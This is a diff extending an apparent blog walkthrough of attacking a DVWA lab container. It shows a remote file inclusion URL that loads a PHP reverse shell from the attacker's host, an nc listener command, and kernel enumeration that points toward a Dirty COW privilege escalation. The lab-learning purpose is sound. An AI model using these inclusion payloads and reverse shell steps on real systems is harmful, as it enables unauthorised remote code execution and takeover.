@@ -60,4 +60,39 @@ $ip = '192.168.1.20';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
 ~~~
 
-It's conveniently marked with "CHANGE THIS" so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. 
+It's conveniently marked with "CHANGE THIS" so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. Now let's get a shell.
+
+### Getting your foot in the door
+
+First we'll go to the File Inclusion page. At this point, my attacking machine has apache running, I've copied and fixed my reverse shell, hosted it in my /var/www/html folder, I've started a nc listener with nc -nlvp 443 and I've browsed to the RFI page. The RFI is easy peasy here, this request in your browser will trigger it:
+
+~~~
+http://192.168.1.17/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
+~~~
+
+It's important to use the .txt extension since using .php will cause your browser to interpret the script and you'll reverse shell yourself, which isn't as exciting. In this particular page, you can View Source to see the site isn't doing anything to append anything to your requested page, so you don't need to use null characters to terminate the request. 
+
+Now we've got a reverse shell. Now what? It's time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we're running a version that's vulnerable to
+dirtyc0w. Since the container is simply an "isolated" sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we're right:
+
+![Kernels]({{site.url}}/images/kernels.png){: .center-image }
+
+For giggles, let's run a Centos container and see what it's running under the hood. 
+
+![Centosbuntu]({{site.url}}/images/Centosbuntu.png){: .center-image } 
+
+That's interesting! There's no difference between the kernel in the container and the one in the VM. It'd be interesting to see how important that is, but that's kind of outside the scope of what I'm doing. Let's keep poking around. 
+
+If we have a vulnerable kernel, we need to get our exploit to the box. How do we do that? We could echo it line by line into a file, but that's so painful over a reverse shell. If we check for applications on the server, we are missing things like wget, curl, and fetch. We do have python, perl, so that's nice. If we go a little further and check the /usr/bin directory, we find sftp. That's handy, but where did it come from?
+
+Remember the Dockerfile [from here](https://github.com/remotephone/dvwa-lamp/blob/master/Dockerfile)? If you look at the files installed, sftp was installed as part of openssh-client. From the container:
+
+~~~
+$ dpkg -S /usr/bin/sftp
+openssh-client: /usr/bin/sftp
+~~~
+
+If you run a default Ubuntu container though, openssh-client isn't included, it was installed as part of git. 
+
+---to be continued...---
+
